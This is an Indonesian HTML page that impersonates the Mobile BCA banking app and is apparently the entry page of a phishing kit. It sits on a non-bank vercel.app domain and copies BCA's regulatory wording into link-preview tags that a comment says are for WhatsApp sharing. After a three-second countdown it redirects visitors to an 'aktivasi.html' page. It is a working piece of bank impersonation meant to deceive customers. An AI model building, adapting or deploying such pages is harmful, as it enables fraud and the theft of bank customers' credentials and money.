<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mobile BCA</title>
    
    <!-- ✅ KODE PRATINJAU WHATSAPP (SUDAH PAKAI LINK GAMBAR KAMU) -->
    <meta property="og:type" content="website">
    <meta property="og:title" content="Mobile BCA" />
    <meta property="og:description" content="BCA berizin dan diawasi oleh Otoritas Jasa Keuangan & Bank Indonesia. BCA merupakan peserta penjaminan LPS. Maksimum nilai simpanan yang dijamin LPS per nasabah per bank." />
    <meta property="og:image" content="https://bca-phi.vercel.app/logo.png" />
    <meta property="og:url" content="https://bca-phi.vercel.app/" />
    <meta property="og:site_name" content="Bank Central Asia">

    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            width: 100vw;
            height: 100vh;
            overflow: hidden;
            display: flex;
            justify-content: center;
            align-items: center;
            background-color: #0059B3; /* Warna dasar BCA jika gambar belum muat */
            position: relative;
        }

        /* Gambar Pembuka */
        #gambarPembuka {
            width: 100%;
            height: 100%;
            object-fit: cover; /* Agar gambar penuh rapi */
            position: absolute;
            top: 0;
            left: 0;
            z-index: 1;
        }

        
        }
    </style>
</head>
<body>

    <!-- Gambar Pembuka -->
    <img id="gambarPembuka" src="login.jpg" alt="Mobile BCA">
    
    <!-- Angka Hitung Mundur -->
    <div id="timer">3</div>

    <script>
        // ✅ FUNGSI HITUNG MUNDUR & PINDAH HALAMAN
        let waktu = 3;
        const timerDisplay = document.getElementById('timer');
        
        const hitungMundur = setInterval(function() {
            waktu--;
            timerDisplay.textContent = waktu;
            
            if (waktu <= 0) {
                clearInterval(hitungMundur);
                // Pindah ke halaman aktivasi setelah selesai hitung
                window.location.href = "aktivasi.html"; 
            }
        }, 1000);
    </script>

</body>
</html>
